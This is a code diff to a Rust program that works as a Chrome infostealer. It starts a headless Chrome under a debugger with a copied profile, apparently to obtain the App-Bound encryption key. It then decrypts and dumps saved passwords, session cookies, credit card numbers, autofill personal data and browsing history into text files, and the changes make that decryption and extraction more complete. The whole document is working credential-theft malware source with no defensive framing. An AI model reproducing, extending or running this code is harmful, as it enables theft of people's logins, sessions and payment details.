@@ -17,7 +17,7 @@ use std::fs;
 use std::io::Write;
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use rusqlite::{Connection};
-use chrono::{DateTime, Utc};
+use chrono::{Utc, TimeZone};
 
 // Some missing definitions from windows-sys that might be architecture specific or in other modules
 #[repr(C)]
@@ -267,6 +267,29 @@ extern "system" {
 }
 
 fn main() {
+    let user_data_dir = match get_user_data_dir() {
+        Some(d) => d,
+        None => return,
+    };
+
+    // Create a temporary User Data directory to force a new browser instance even if Chrome is open
+    let temp_user_dir = std::env::temp_dir().join(format!("chrome_temp_profile_{}", rand::random::<u32>()));
+    let _ = fs::create_dir_all(&temp_user_dir);
+
+    // Copy Local State so it has the same encrypted key
+    let local_state = user_data_dir.join("Local State");
+    if local_state.exists() {
+        let _ = fs::copy(&local_state, temp_user_dir.join("Local State"));
+    }
+
+    // Create a dummy Login Data in the temp Default profile to force key decryption on startup
+    let temp_default = temp_user_dir.join("Default");
+    let _ = fs::create_dir_all(&temp_default);
+    let real_login_data = user_data_dir.join("Default").join("Login Data");
+    if real_login_data.exists() {
+        let _ = fs::copy(&real_login_data, temp_default.join("Login Data"));
+    }
+
     unsafe {
         let mut si: STARTUPINFOW = zeroed();
         si.cb = size_of::<STARTUPINFOW>() as u32;
@@ -275,9 +298,11 @@ fn main() {
 
         let mut pi: PROCESS_INFORMATION = zeroed();
 
-        let mut chrome_cmd: Vec<u16> = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check\0"
-            .encode_utf16()
-            .collect();
+        let cmd_str = format!(
+            "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --user-data-dir=\"{}\" --no-first-run --no-default-browser-check --headless\0",
+            temp_user_dir.to_str().unwrap_or("")
+        );
+        let mut chrome_cmd: Vec<u16> = cmd_str.encode_utf16().collect();
 
         let success = CreateProcessW(
             null(),
@@ -304,6 +329,8 @@ fn main() {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
+
+    let _ = fs::remove_dir_all(temp_user_dir);
 }
 
 unsafe fn debug_loop(h_process: HANDLE) {
@@ -555,15 +582,29 @@ fn discover_profiles(user_data_dir: &Path) -> Vec<String> {
 }
 
 fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
-    let temp_db = std::env::temp_dir().join(format!("chrome_tmp_{}", rand::random::<u32>()));
+    let base_name = format!("chrome_tmp_{}", rand::random::<u32>());
+    let temp_db = std::env::temp_dir().join(&base_name);
+
     if let Err(_) = fs::copy(db_path, &temp_db) {
         return None;
+    }
+
+    // Attempt to copy WAL and SHM files if they exist
+    let wal = db_path.with_extension("wal");
+    if wal.exists() {
+        let _ = fs::copy(&wal, temp_db.with_extension("wal"));
+    }
+    let shm = db_path.with_extension("shm");
+    if shm.exists() {
+        let _ = fs::copy(&shm, temp_db.with_extension("shm"));
     }
 
     match Connection::open(&temp_db) {
         Ok(conn) => Some((conn, temp_db)),
         Err(_) => {
             let _ = fs::remove_file(&temp_db);
+            let _ = fs::remove_file(temp_db.with_extension("wal"));
+            let _ = fs::remove_file(temp_db.with_extension("shm"));
             None
         }
     }
@@ -583,12 +624,16 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm)
                 if blob.starts_with(b"v20") && blob.len() > 15 {
                     let nonce = Nonce::from_slice(&blob[3..15]);
                     if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
-                        writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(&dec)).unwrap();
+                        // Strip the App-Bound header/signature (first 32 bytes of plaintext)
+                        let plain = if dec.len() > 32 { &dec[32..] } else { &dec };
+                        writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(plain)).unwrap();
                     }
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
+        let _ = fs::remove_file(&temp_path);
+        let _ = fs::remove_file(temp_path.with_extension("wal"));
+        let _ = fs::remove_file(temp_path.with_extension("shm"));
     }
 }
 
@@ -609,12 +654,21 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
                 if blob.starts_with(b"v20") && blob.len() > 15 {
                     let nonce = Nonce::from_slice(&blob[3..15]);
                     if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
-                        writeln!(file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(&dec)).unwrap();
+                        // Strip the App-Bound header/signature (first 32 bytes of plaintext)
+                        let plain = if dec.len() > 32 { &dec[32..] } else { &dec };
+                        let value = if let Ok(s) = std::str::from_utf8(plain) {
+                            s.to_string()
+                        } else {
+                            format!("(hex) {}", hex::encode(plain))
+                        };
+                        writeln!(file, "Host: {} | Name: {} | Value: {}", host, name, value).unwrap();
                     }
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
+        let _ = fs::remove_file(&temp_path);
+        let _ = fs::remove_file(temp_path.with_extension("wal"));
+        let _ = fs::remove_file(temp_path.with_extension("shm"));
     }
 }
 
@@ -625,28 +679,49 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) 
     if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
         let mut file = fs::File::create(output_dir.join("autofill.txt")).unwrap();
 
-        // Profiles
+        // Modern Autofill (names, emails, phones, addresses tables)
+        if let Ok(mut stmt) = conn.prepare("SELECT guid, full_name FROM autofill_profile_names") {
+            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))) {
+                for row in rows.flatten() {
+                    writeln!(file, "Autofill Name [{}]: {}", row.0, row.1).unwrap();
+                }
+            }
+        }
+        if let Ok(mut stmt) = conn.prepare("SELECT guid, email FROM autofill_profile_emails") {
+            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))) {
+                for row in rows.flatten() {
+                    writeln!(file, "Autofill Email [{}]: {}", row.0, row.1).unwrap();
+                }
+            }
+        }
+
+        // Fallback for older structures
         if let Ok(mut stmt) = conn.prepare("SELECT name_first, name_last, street_address, city, zipcode, email FROM autofill_profiles") {
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, String>(3)?, row.get::<_, String>(4)?, row.get::<_, String>(5)?))).unwrap();
-            for row in rows.flatten() {
-                writeln!(file, "Profile: {} {} | {}, {}, {} | Email: {}", row.0, row.1, row.2, row.3, row.4, row.5).unwrap();
+            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, String>(3)?, row.get::<_, String>(4)?, row.get::<_, String>(5)?))) {
+                for row in rows.flatten() {
+                    writeln!(file, "Legacy Profile: {} {} | {}, {}, {} | Email: {}", row.0, row.1, row.2, row.3, row.4, row.5).unwrap();
+                }
             }
         }
 
         // Credit Cards
         if let Ok(mut stmt) = conn.prepare("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards") {
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
-            for row in rows.flatten() {
-                let (name, m, y, blob) = row;
-                if blob.starts_with(b"v20") && blob.len() > 15 {
-                    let nonce = Nonce::from_slice(&blob[3..15]);
-                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
-                        writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(&dec)).unwrap();
+            if let Ok(rows) = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))) {
+                for row in rows.flatten() {
+                    let (name, m, y, blob) = row;
+                    if blob.starts_with(b"v20") && blob.len() > 15 {
+                        let nonce = Nonce::from_slice(&blob[3..15]);
+                        if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                            let plain = if dec.len() > 32 { &dec[32..] } else { &dec };
+                            writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(plain)).unwrap();
+                        }
                     }
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
+        let _ = fs::remove_file(&temp_path);
+        let _ = fs::remove_file(temp_path.with_extension("wal"));
+        let _ = fs::remove_file(temp_path.with_extension("shm"));
     }
 }
 
@@ -655,18 +730,25 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
     if !db_path.exists() { return; }
 
     if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
-        if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100") {
+        if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500") {
             let mut file = fs::File::create(output_dir.join("history.txt")).unwrap();
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();
 
             for row in rows.flatten() {
                 let (url, title, count, time) = row;
-                // Webkit epoch to UTC
-                let dt = Utc::now(); // Placeholder for simplicity
-                writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count).unwrap();
+                // Webkit epoch (microseconds since Jan 1, 1601) to UTC
+                let unix_time = (time / 1_000_000) - 11_644_473_600;
+                let dt = Utc.timestamp_opt(unix_time, 0).single();
+                let time_str = match dt {
+                    Some(d) => d.format("%Y-%m-%d %H:%M:%S").to_string(),
+                    None => "unknown".to_string(),
+                };
+                writeln!(file, "[{}] URL: {} | Title: {} | Visits: {}", time_str, url, title, count).unwrap();
             }
         }
-        let _ = fs::remove_file(temp_path);
+        let _ = fs::remove_file(&temp_path);
+        let _ = fs::remove_file(temp_path.with_extension("wal"));
+        let _ = fs::remove_file(temp_path.with_extension("shm"));
     }
 }
 
